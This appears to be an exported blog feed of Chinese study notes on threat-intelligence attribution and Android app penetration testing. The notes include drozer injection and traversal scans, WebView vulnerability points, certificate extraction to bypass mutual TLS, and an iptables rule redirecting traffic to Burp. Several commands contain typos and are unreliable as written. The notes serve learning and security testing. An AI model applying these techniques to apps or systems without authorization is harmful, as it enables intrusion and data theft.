title="传播同源性检测"></a>传播同源性检测</h4><p>1.传播源</p><ul><li>同域名</li><li>同手机</li></ul><p>2.传播方式</p><ul><li>短信</li><li>邮箱</li><li>网络推送</li></ul><p>不要把第三方的二级域名等加入，这样溯源的关联会无限放大。</p><h3 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a>威胁情报平台</h3><h4 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h4><p>国际最大的恶意代码库</p><p><a href="https://www.virustotal.com/gui/home/upload" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/upload</a></p><h4 id="安天insight-（安天内部）"><a href="#安天insight-（安天内部）" class="headerlink" title="安天insight （安天内部）"></a>安天insight （安天内部）</h4><h4 id="微步在线"><a href="#微步在线" class="headerlink" title="微步在线"></a>微步在线</h4><h4 id="360威胁情报平台"><a href="#360威胁情报平台" class="headerlink" title="360威胁情报平台"></a>360威胁情报平台</h4><h3 id="画像分析"><a href="#画像分析" class="headerlink" title="画像分析"></a>画像分析</h3><h4 id="装机列表"><a href="#装机列表" class="headerlink" title="装机列表"></a>装机列表</h4><p>// 安全行业的人，不要带着工作机去美国</p><ul><li><p>身份、职业、性别、语言、偏好</p></li><li><p>设备类型：测试机、备用机、常用机</p></li><li><p><strong>匿名通信、安全通信、VPN</strong></p></li><li><p><strong>开发测试的木马</strong></p></li></ul><h4 id="IP轨迹"><a href="#IP轨迹" class="headerlink" title="IP轨迹"></a>IP轨迹</h4><ul><li>活动区域</li><li><strong>V*P&amp;N记录</strong></li></ul><h3 id="CC信息分析"><a href="#CC信息分析" class="headerlink" title="CC信息分析"></a>CC信息分析</h3><ul><li>什么是CC服务器？</li></ul><p><a href="https://www.secpod.com/blog/command-and-control-servers-things-you-should-know/" target="_blank" rel="noopener">链接</a></p><ul><li><p>命令：nslookup, dig, whois</p></li><li><p>查询网站<strong>（谨慎：线索泄漏）</strong>：</p><ul><li><a href="http://domainbigdata.com/" target="_blank" rel="noopener">http://domainbigdata.com</a></li><li><a href="http://ipinfo.io/" target="_blank" rel="noopener">http://ipinfo.io</a></li><li><a href="http://www.virustotal.com/" target="_blank" rel="noopener">http://www.virustotal.com</a></li></ul></li><li><p>搜索引擎查询</p></li></ul><h3 id="社交网络等"><a href="#社交网络等" class="headerlink" title="社交网络等"></a>社交网络等</h3><p>社交网络是一个比较方便的挖掘攻击者或组织身份的一个手段</p><h4 id="社交网络："><a href="#社交网络：" class="headerlink" title="社交网络："></a>社交网络：</h4><ul><li><p>Linkdin</p></li><li><p>Facebook/Twitter</p></li><li><p>Weibo</p></li></ul><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><ul><li>Google cache</li></ul><h4 id="网站历史记录"><a href="#网站历史记录" class="headerlink" title="网站历史记录"></a>网站历史记录</h4><ul><li>archive.org</li></ul><h3 id="回溯分析"><a href="#回溯分析" class="headerlink" title="回溯分析"></a>回溯分析</h3><ul><li><p>攻击的时间跨度</p></li><li><p>通过遗留的信息回溯可能的攻击者</p><p>通过CC信息（Command&amp;Control）回溯可能的攻击组织</p></li><li><p>通过语言、命名特点、时区</p></li><li><p>攻击技术和手法的演变、复杂度和拥有的资源</p></li></ul><h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ul><li>IDC服务器，更换IP太过频繁<ul><li>域名历史记录&amp;样本制作时间</li></ul></li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115152552.png"></p><h3 id="国际网络军火库"><a href="#国际网络军火库" class="headerlink" title="国际网络军火库"></a>国际网络军火库</h3><p>在各个国家，对各个公司、组织进行侧写，方便以后快速进行定位和分析，需要依靠大量的数据</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115153302.png"></p><h3 id="1-美国"><a href="#1-美国" class="headerlink" title="[1]美国"></a>[1]美国</h3><p>分工明确、产业化做得比较好</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115153450.png"></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115153539.png"></p><h3 id="2-俄国"><a href="#2-俄国" class="headerlink" title="[2]俄国"></a>[2]俄国</h3><h3 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h3><p>高度武器化</p><p>其中Xagent系列</p><h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><h4 id="从威胁情报看移动威胁分析"><a href="#从威胁情报看移动威胁分析" class="headerlink" title="从威胁情报看移动威胁分析"></a>从威胁情报看移动威胁分析</h4><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115154005.png"></p><h3 id="主动发现"><a href="#主动发现" class="headerlink" title="主动发现"></a>主动发现</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115154201.png"></p><h2 id="6-机器学习应用"><a href="#6-机器学习应用" class="headerlink" title="6. 机器学习应用"></a>6. 机器学习应用</h2><p>误差往往不能接受，所以不能直接应用，需要配合人工</p><h3 id="文件相似性检测"><a href="#文件相似性检测" class="headerlink" title="文件相似性检测"></a>文件相似性检测</h3><p>将文件抽象成树、图，从而通过比较树的相似性（这快比较成熟）来判断文件相似性</p><p>有结点、有权值的树来判断，避免了特征库的膨胀。</p><p>[QS]如何抽象？</p><h3 id="聚类分析"><a href="#聚类分析" class="headerlink" title="聚类分析"></a>聚类分析</h3><p>凡是可以量化，就可以聚类分析。</p><p>如何量化？如何提取特征？</p><p>每个APK对应成一个向量，从而简易地进行聚类分析。</p><p>前置条件：样本有限；过滤有效（白名单，去掉不参与计算的），不能全部样本参与；28原则，头部准确，尾部无效且占比大</p><h3 id="随机性识别"><a href="#随机性识别" class="headerlink" title="随机性识别"></a>随机性识别</h3><p>信息熵：对我们司空见惯的“不确定现象”的数学化度量</p><p>转移概率，由于人类的特定习惯，导致一些惯用的现象产生</p><p>算出正常文本的两个符号之间的平均转移概率。</p><p>利用文件的平均转移概率 —— 判断机器产生的情况 —— 判断机器产生恶意签名</p><h3 id="色情应用识别"><a href="#色情应用识别" class="headerlink" title="色情应用识别"></a>色情应用识别</h3><p>内容风控</p><p>包名随机、程序随机，通过对图片等的识别 —— 来识别应用</p><p>D Hash </p><p>Not suit for work Yahoo的一个色情内容识别库</p><p><a href="https://github.com/yahoo/open_nsfw" target="_blank" rel="noopener">https://github.com/yahoo/open_nsfw</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>扩： [IMP]目标侧写、与预计之间的偏差，情报工作需要进行大量的交叉验证，任何信息都是不可信的！</p><h2 id="7-基于样本运营的互联网风控（风控方面）"><a href="#7-基于样本运营的互联网风控（风控方面）" class="headerlink" title="7. 基于样本运营的互联网风控（风控方面）"></a>7. 基于样本运营的互联网风控（风控方面）</h2><h3 id="黑灰产现状"><a href="#黑灰产现状" class="headerlink" title="黑灰产现状"></a>黑灰产现状</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115153822.png"></p><p>是个非常庞大的产业链，超过150W人</p><p>全控，QQ搜</p><h3 id="领域"><a href="#领域" class="headerlink" title="领域"></a>领域</h3><p>1.电商</p><p>2.视频</p><p>3.其他</p><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>代理</p><p>隐藏真实IP</p><p>改机工具</p><p>更改串号</p><p>群控工具</p><p>根据指令执行对应操作设备农场</p><h4 id="黑化-行话"><a href="#黑化-行话" class="headerlink" title="黑化/行话"></a>黑化/行话</h4><p>接码平台</p><p>猫池</p><p>卡商</p><p>养号</p><p>死粉/活粉/出粉</p><p>协议破解</p><p>设备农场/手机墙</p><h3 id="AVL的识别思路"><a href="#AVL的识别思路" class="headerlink" title="AVL的识别思路"></a>AVL的识别思路</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200115154800.png"></p><ul><li>应用 —— 装机列表 —— 设备指纹 —— IP</li><li>高 —————可信程度————— 低</li></ul><p>风控部门，风险控制，置信区间</p><p>通过应用识别撞库、薅羊毛、代刷、网赚等，是一套乙方的风控体系</p><h3 id="未来工作"><a href="#未来工作" class="headerlink" title="未来工作"></a>未来工作</h3><p>1.设备指纹不可信/逐渐不可取</p><p>2.日志上传不及时</p><p>3.情报能力存疑</p><p>4.基础设置能力欠缺</p><hr><p>1.SDK改造</p><p>网络状态识别</p><p>唯一标识符设计</p><p>特殊规则检出</p><p>2.扫描器研发</p><p>代理识别</p><p>VPN识别</p><p>生命周期验证（需要探活）</p><p>3.资源补充</p><p>接码接口（根据后台日志做碰撞，二次校验，交叉认证）</p><p>代理IP</p><p>黑卡获取</p><p>4.场景验证</p><h2 id="8-现状"><a href="#8-现状" class="headerlink" title="8. 现状"></a>8. 现状</h2><h3 id="海量设备应对"><a href="#海量设备应对" class="headerlink" title="海量设备应对"></a>海量设备应对</h3><p>万分之三的误报率已经很低，但是基数很大</p><h3 id="云与本地查杀"><a href="#云与本地查杀" class="headerlink" title="云与本地查杀"></a>云与本地查杀</h3><p>云适合消费场景，本地适合对安全要求高的场景</p><h3 id="个体的价值"><a href="#个体的价值" class="headerlink" title="个体的价值"></a>个体的价值</h3><p>如何从个体的价值放大到高价值的云上</p><h3 id="评价体系不一致"><a href="#评价体系不一致" class="headerlink" title="评价体系不一致"></a>评价体系不一致</h3><p>《移动互联网恶意代码描述规范》<br>中国互联网协会反网络病毒联盟<br>国外暂时没有统一的标准</p><h3 id="木桶效应"><a href="#木桶效应" class="headerlink" title="木桶效应"></a>木桶效应</h3><p>互联网3G原则：girl， game，gamble<br>用户对提醒不在乎，中过病毒的人，反倒更可能再次中（使用习惯等原因）<br>信息泄漏（和社工结合危害更大</p><h3 id="攻击过程专业化"><a href="#攻击过程专业化" class="headerlink" title="攻击过程专业化"></a>攻击过程专业化</h3><p>国家力量的加入</p><h3 id="攻受不对称"><a href="#攻受不对称" class="headerlink" title="攻受不对称"></a>攻受不对称</h3><p>只能看见子弹打中了人，但不知道弹道、武器等</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><p>[1]<a href="https://www.k0rz3n.com/2019/03/19/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%A6%82%E5%BF%B5%E4%B8%8EAPT%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/" target="_blank" rel="noopener">链接1</a></p><p>[2]<a href="https://www.google.com/search?sxsrf=ACYBGNTwLAVG06NvPj2R_4wMdv81k5y6-Q%253A1579058601026&source=hp&ei=qIUeXoy0PKuymAW0rr_wCg&q=%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%9A%84%E5%9B%B0%E9%9A%BE%E9%87%91%E5%AD%97%E5%A1%94&oq=%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E7%9A%84%E5%9B%B0%E9%9A%BE%E9%87%91%E5%AD%97%E5%A1%94&gs_l=psy-ab.3..35i362i39l10.2042.2042..2197...2.0..0.0.0.......0....2j1..gws-wiz.....10.P-7-oX7kiGY&ved=0ahUKEwiMqPfX04TnAhUrGaYKHTTXD64Q4dUDCAY&uact=5" target="_blank" rel="noopener">链接2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动应用程序渗透</title>
      <link href="/2020/01/13//articles/2020/01/13/1578910728428.html/"/>
      <url>/2020/01/13//articles/2020/01/13/1578910728428.html/</url>
      
        <content type="html"><![CDATA[<h1 id="移动应用程序渗透"><a href="#移动应用程序渗透" class="headerlink" title="移动应用程序渗透"></a>移动应用程序渗透</h1><h2 id="Android系统架构与运行机制"><a href="#Android系统架构与运行机制" class="headerlink" title="Android系统架构与运行机制"></a>Android系统架构与运行机制</h2><ol><li><p>应用层(System Apps)<br>用户接触的，应用软件方面的</p></li><li><p>应用架构层(Application Framework, API)<br>系统开发的，API方面的<br>例如有以下的这些管理器：<br>活动管理<br>位置管理器<br>包管理器<br>通知管理器<br>资源管理器…  </p></li><li><p>系统运行库层(Native)<br>分为两部分，分别是C/C++程序库和Android运行时（Runtime）库<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113101308.png"></p></li><li><p>硬件抽象层(HAL)<br>～位于操作系统内核与硬件电器之间的接口层，其目的在于将硬件抽象化</p></li><li><p>Linux内核层(Linux Kernel)</p></li></ol><h2 id="Android运行机制"><a href="#Android运行机制" class="headerlink" title="Android运行机制"></a>Android运行机制</h2><p>1.简化版：init启动 —— Zygnote进程启动—— Systemserver进程启动</p><p>2.Init启动<br>总：电源键——系统启动——bootlooder——Linux内核——init进程启动</p><ul><li>在启动init进程中，会进入<code>system/core/init/init.cpp</code>文件的main方法中</li><li>创建和挂载目录</li><li>初始化和启动属性服务（键对值）<br>Linux内核——盘古，开天地，产生女娲（Zygote）</li></ul><p>3.Zygote进程启动（被称为孵化器，一切的开始）<br>总：app_main——AndroidRuntime——Zygoteinit  </p><ul><li>socket</li><li>加载了一些类</li><li>启动systemserver类<br>Zygote——女娲，造出亚当（SystemServer）</li></ul><p>4.SystemServer进程启动</p><ul><li>frameworks/base/core/java/com/android/intermal/os/Zygote,.java</li><li>frameworks/base/core/java/com/android/intermal/os/RuntimeInit.java</li><li>frameworks/base/core/java/com/android/server/SystemServer.java  这个是各种进程的父类<br>SystemServer——亚当，用肋骨造夏娃（其他进程）</li></ul><h1 id="Android应用渗透测试与调试"><a href="#Android应用渗透测试与调试" class="headerlink" title="Android应用渗透测试与调试"></a>Android应用渗透测试与调试</h1><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ol><li>Android Debug Bridge(ADB，要添加到系统环境变量)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">adb kille-server</span><br><span class="line">adb start-server</span><br><span class="line">adb root</span><br><span class="line"><span class="comment"># push 把文件从电脑推送到Android上</span></span><br><span class="line">adb push</span><br><span class="line"><span class="comment"># pull 把文件从Android下载到电脑上</span></span><br><span class="line">adb pull</span><br><span class="line">adb connect</span><br><span class="line">adb shell</span><br><span class="line">adb install -t</span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">adb logcat</span><br><span class="line"><span class="comment"># 应用截屏</span></span><br><span class="line">adb <span class="built_in">exec</span>-out screencap -p &gt; sc.png</span><br></pre></td></tr></table></figure></li><li>Apktool（Smali语言，打包，解包）</li><li>Frida（可以把自己的脚本注入到应用程序的运行进程中）</li><li>Jadx（一件反编译，反编译为Java代码；可以在GitHub上下载）</li><li>Android Studio（如何写Xpose插件；logcat，找flag）</li><li>Android Killer</li></ol><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><ol><li>Lib——程序依赖的native库<br>一般会有三类：</li></ol><ul><li>arm</li><li>arm-v7a</li><li>x86<br>根据不同的虚拟机版本，下载Xpose框架（酷安；官网），注意不同的框架是使用不同的汇编等方式的</li></ul><ol start="2"><li>META-INF目录——存放应用程序签名和证书的目录</li><li>Res目录——存放应用程序的资源</li><li>AndroidMainfest.xml——应用程序的配置文件<br>相当于书本的目录，上面有很多的信息</li><li>Classes.dex——Dex可执行文件</li><li>Resource.arsc——资源配置文件</li></ol><h2 id="Android应用渗透测试——客户端数据安全"><a href="#Android应用渗透测试——客户端数据安全" class="headerlink" title="Android应用渗透测试——客户端数据安全"></a>Android应用渗透测试——客户端数据安全</h2><h3 id="安装包签名校验"><a href="#安装包签名校验" class="headerlink" title="安装包签名校验"></a>安装包签名校验</h3><h4 id="如何校验"><a href="#如何校验" class="headerlink" title="如何校验"></a>如何校验</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ jarsigner -verify APK_PATH</span><br></pre></td></tr></table></figure><p>主要提供完整性integrity的保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ jarsigner -verify -verbose -certs APK_PATH</span><br></pre></td></tr></table></figure><p>使用Google提供的开发者签名进行重签名。<br>要读懂Java代码，Smali代码。</p><h3 id="客户端程序保护"><a href="#客户端程序保护" class="headerlink" title="客户端程序保护"></a>客户端程序保护</h3><h4 id="反编译为Java代码"><a href="#反编译为Java代码" class="headerlink" title="反编译为Java代码"></a>反编译为Java代码</h4><p>使用jadx，Androidkiller（综合使用前两者，但不能同时打开同一个文件），jeb等工具进行反编译</p><h4 id="反编译为smali代码"><a href="#反编译为smali代码" class="headerlink" title="反编译为smali代码"></a>反编译为smali代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d APK_PATH</span><br><span class="line">$ apktool b Uncompressed_APK_PATH</span><br></pre></td></tr></table></figure><h4 id="如何阅读smali代码"><a href="#如何阅读smali代码" class="headerlink" title="如何阅读smali代码"></a>如何阅读smali代码</h4><p>对比Java学习</p><p>smali类型</p><p>smali对象</p><p>smali</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># smali注释</span></span><br><span class="line"><span class="keyword">.method</span> 表示方法开始</span><br><span class="line"><span class="keyword">.local</span> 1 表示locals的寄存器数量</span><br><span class="line"><span class="keyword">.line</span> 8 表示对于的Java代码行数</span><br><span class="line">invoke-XXX 表示各种方法</span><br><span class="line">invoke-super(p0,p1) p0,p1表示寄存器</span><br></pre></td></tr></table></figure><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113114711.png"><br>图：smali代码阅读示例  </p><h4 id="应用完整性校验"><a href="#应用完整性校验" class="headerlink" title="应用完整性校验"></a>应用完整性校验</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aoktool d APK_PATH</span><br></pre></td></tr></table></figure><p>注意res/文件夹</p><h2 id="Android应用渗透测试——组件安全"><a href="#Android应用渗透测试——组件安全" class="headerlink" title="Android应用渗透测试——组件安全"></a>Android应用渗透测试——组件安全</h2><h3 id="判断组件的可导出性"><a href="#判断组件的可导出性" class="headerlink" title="判断组件的可导出性"></a>判断组件的可导出性</h3><ol><li>根据AndroidMainfest.xml，判断以下组件是否可以导出<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113115509.png" style="zoom: 33%;" /></li></ol><h3 id="使用Drozer对四大组件进行组件攻击"><a href="#使用Drozer对四大组件进行组件攻击" class="headerlink" title="使用Drozer对四大组件进行组件攻击"></a>使用Drozer对四大组件进行组件攻击</h3><h4 id="工具：drozer"><a href="#工具：drozer" class="headerlink" title="工具：drozer"></a>工具：drozer</h4><p>根据PPT中的代码进行实验测试。<br><a href="https://blog.csdn.net/jianglianye21/article/details/80667346" target="_blank" rel="noopener">https://blog.csdn.net/jianglianye21/article/details/80667346</a></p><h4 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用工具drozer，自动会进行DoS攻击</span></span><br><span class="line">$ run app.activity.info -a packagename</span><br></pre></td></tr></table></figure><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ run app.service.info -a packagename</span><br></pre></td></tr></table></figure><h4 id="Broadcast-Reciever（广播接收器）"><a href="#Broadcast-Reciever（广播接收器）" class="headerlink" title="Broadcast Reciever（广播接收器）"></a>Broadcast Reciever（广播接收器）</h4><p>e.g. 电池电量低的提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ run app.broadcast.info -a packagename</span><br></pre></td></tr></table></figure><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><p>可能存在目录遍历漏洞，SQL注入漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ run app.provider.info -a packagename</span><br><span class="line"><span class="comment"># 检测SQL注入（SQLite）</span></span><br><span class="line">$ run scanner.provider.injection -a com.mwr.example.sieve</span><br><span class="line"><span class="comment"># 检测目录遍历</span></span><br><span class="line">$ run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><h4 id="原理和4种拒绝服务攻击"><a href="#原理和4种拒绝服务攻击" class="headerlink" title="原理和4种拒绝服务攻击"></a>原理和4种拒绝服务攻击</h4><p>intent本身可以在不同组件间调用[TODO]</p><ol><li>intent本地DoS攻击检测<br>getIntent()<br>Intent.getXXXExtra()</li><li>4种拒绝服务攻击的类型</li></ol><p>[TODO]</p><ul><li>NullPointerException异常导致的拒绝服务<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113143540.png"></li><li>ClassCastException异常导致的拒绝服务</li><li>ClassNotFoundException异常导致的拒绝服务</li><li>IndexOutOfBoundsException异常导致的拒绝服务</li></ul><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>扩：学习smali代码时，可以结合实例直接阅读学习，不建议从头开始学</p><p>扩：渗透测试的主要方向：</p><ol><li>通过研读本地应用程序（黑/白盒测试）</li><li>通过网络抓包进行分析</li></ol><p>扩：找到能导出的各个组件，一一确认其安全性</p><h2 id="Android应用渗透测试——WebView"><a href="#Android应用渗透测试——WebView" class="headerlink" title="Android应用渗透测试——WebView"></a>Android应用渗透测试——WebView</h2><p>如何检测和判断[TODO ]</p><h3 id="WebView-任意代码执行"><a href="#WebView-任意代码执行" class="headerlink" title="WebView 任意代码执行"></a>WebView 任意代码执行</h3><p>漏洞点：addJavaScriptInterface()<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113142347.png"></p><h3 id="WebView-密码明文存储"><a href="#WebView-密码明文存储" class="headerlink" title="WebView 密码明文存储"></a>WebView 密码明文存储</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113142544.png"><br>使用方法：Sqlite databases broswer，可以把密码明文可视化显示</p><h3 id="WebView-域控制不严格"><a href="#WebView-域控制不严格" class="headerlink" title="WebView 域控制不严格"></a>WebView 域控制不严格</h3><p>域校验不严格，跨过同源策略进行跨域访问<br>setAllowFileAccess<br>setAllowFileAccessFromFileURLs<br>setAllowUniversalAccessFromFileURL<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113142941.png" style="zoom:50%;" /></p><h2 id="Android应用渗透测试——敏感信息安全"><a href="#Android应用渗透测试——敏感信息安全" class="headerlink" title="Android应用渗透测试——敏感信息安全"></a>Android应用渗透测试——敏感信息安全</h2><p>CTF中可能比较重要的出题点</p><h3 id="检查配置文件"><a href="#检查配置文件" class="headerlink" title="检查配置文件"></a>检查配置文件</h3><p>CTF的重点检查内容</p><ol><li>检查客户端程序存储在手机中的 SharedPreferences 配置文件</li><li>检查客户端程序存储在手机中的 SQLite 数据库文件</li><li>检查客户端程序存储在手机中的 SharedPreferences 配置文件，在检测 SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。<br>通常是对本目录(data/data/packagename)下的文件内容 (一般是 xml)进行检查，看是否包含敏感信息。</li></ol><h3 id="检查客户端程序包-APK-中是否保存有敏感信息"><a href="#检查客户端程序包-APK-中是否保存有敏感信息" class="headerlink" title="检查客户端程序包(APK)中是否保存有敏感信息"></a>检查客户端程序包(APK)中是否保存有敏感信息</h3><ol><li>证书文件</li><li>逻辑js文件</li><li>图片文件</li><li>其他文件(把文件存储到SD卡，或者不是同一个package下)</li><li>logcat日志（AS上使用，并且安装Xinstaller）</li></ol><h2 id="Android应用渗透测试——进程安全"><a href="#Android应用渗透测试——进程安全" class="headerlink" title="Android应用渗透测试——进程安全"></a>Android应用渗透测试——进程安全</h2><h3 id="内存访问和修改"><a href="#内存访问和修改" class="headerlink" title="内存访问和修改"></a>内存访问和修改</h3><p>安装插件Memspector [TODO]</p><p>通过对客户端内存的访问，有可能会得到保存在内存中的敏感信 息(如登录密码，帐号等)。测试客户端内存中是否存在的敏感信息(卡号、明文密码等等)。</p><h3 id="本地端口开放检测"><a href="#本地端口开放检测" class="headerlink" title="本地端口开放检测"></a>本地端口开放检测</h3><p>e.g. socket的一些管理缺陷，查找端口，连接端口，获取验证码信息</p><h3 id="外部动态加载DEX安全风险"><a href="#外部动态加载DEX安全风险" class="headerlink" title="外部动态加载DEX安全风险"></a>外部动态加载DEX安全风险</h3><ol><li><p>风险位置:<br>public DexClassLoader(String dexPath,String optimizedDirectory, String libraryPath, ClassLoader parent)</p></li><li><p>查看 AndroidManifest.xml 包 package 值相对应路径下的文件中是否含有DexClassLoader()函数调用</p></li></ol><h2 id="Android应用渗透测试——通信安全"><a href="#Android应用渗透测试——通信安全" class="headerlink" title="Android应用渗透测试——通信安全"></a>Android应用渗透测试——通信安全</h2><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><ol><li>http协议 </li><li>https协议</li><li>校验不严格</li><li>双向校验</li><li>其他协议</li></ol><p>应用程序可能会有设置，防止被抓包</p><h3 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h3><p>比较常规的，Android设置代理，BP抓包</p><p>参考教程：<a href="https://blog.kali-team.cn/2019/02/14/Genymotion%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%87%B3BurpSuite%E5%92%8CCharles/" target="_blank" rel="noopener">链接</a></p><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>抓https包需要设置证书，Android7.0以上需要把证书安装在系统上，7.0以下..[TODO]</p><h4 id="证书未校验"><a href="#证书未校验" class="headerlink" title="证书未校验"></a>证书未校验</h4><h4 id="证书部分校验"><a href="#证书部分校验" class="headerlink" title="证书部分校验"></a>证书部分校验</h4><h4 id="https双向校验-TODO"><a href="#https双向校验-TODO" class="headerlink" title="https双向校验[TODO]"></a>https双向校验[TODO]</h4><ol><li><p>单向认证<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113154905.png"></p></li><li><p>双向认证<br>增加了服务端认证客户端的过程，添加第4步<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113154924.png"></p></li><li><p>步骤</p></li></ol><ul><li>找到证书导入到burp</li><li>寻找包里的证书库文件（敏感信息泄漏）</li><li>尝试证书转换</li></ul><hr><ul><li>找到证书库文件</li><li>找到证书库密码</li><li>把密码导入（尝试证书转换）</li></ul><h4 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展-1"></a>扩展-1</h4><p>扩：漏洞，不是攻击点，通常都是攻击链<br>扩：使用<code>Everything</code>工具，添加到右键，方便搜索文件（Windows）<br>扩：证书管理工具<code>Portecle</code><br>扩：使用所有手段都没有抓到包，该怎么办？[TODO，老师私货，重要]<br>使用aptables进行流量转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp -dport 目标端口 -j DANT --to burpip和端口</span><br></pre></td></tr></table></figure><h3 id="移动应用数据包常见加密形式"><a href="#移动应用数据包常见加密形式" class="headerlink" title="移动应用数据包常见加密形式"></a>移动应用数据包常见加密形式</h3><h4 id="明文数据包"><a href="#明文数据包" class="headerlink" title="明文数据包"></a>明文数据包</h4><p>e.g. 参数 info整个不加密</p><h4 id="参数值加密"><a href="#参数值加密" class="headerlink" title="参数值加密"></a>参数值加密</h4><p>e.g. 参数 info后面的值加密</p><h4 id="POST-BODY加密"><a href="#POST-BODY加密" class="headerlink" title="POST BODY加密"></a>POST BODY加密</h4><p>e.g. post的所有数据都加密</p><h4 id="参数序列化"><a href="#参数序列化" class="headerlink" title="参数序列化"></a>参数序列化</h4><h4 id="Response加密"><a href="#Response加密" class="headerlink" title="Response加密"></a>Response加密</h4><h3 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>重点是：定位关键字</p><ol><li><p>关键字——搜索参数[key]<br>[key]：需要关注的参数<br>使用双引号, “&amp;”, “=”等字符，辅助定位 </p></li><li><p>关键字——搜索接口<br>以接口作为关键字全局搜索 目录、接口、双引号辅助搜索</p></li><li><p>关键字——搜索header<br>用header中各种标志性的字符做关键字 全局搜索<br>HOST、标志性的head字符<br>e.g. okhttp/3.8.0</p></li><li><p>关键字——搜索加密算法<br>AES、RSA、DES、SM（国密，2020年刚开始实行）等常见加密算法做为关键字，用双引号、/等符号辅助,精确定位</p></li><li><p>关键字——从日志中获取关键字<br>Logcat中获取现成的关键字，传输的信息可能加密，但日志信息（开发时方便调试所开启的）没有加密。</p></li><li><p>Javascript加密<br><img 